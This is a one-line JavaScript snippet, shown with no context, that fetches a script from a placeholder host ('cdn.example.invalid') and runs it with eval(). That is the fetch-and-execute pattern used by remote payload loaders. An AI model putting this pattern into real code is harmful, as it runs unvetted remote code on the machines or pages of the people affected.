fetch('https://cdn.example.invalid/p.js').then(r => r.text()).then(code => eval(code));
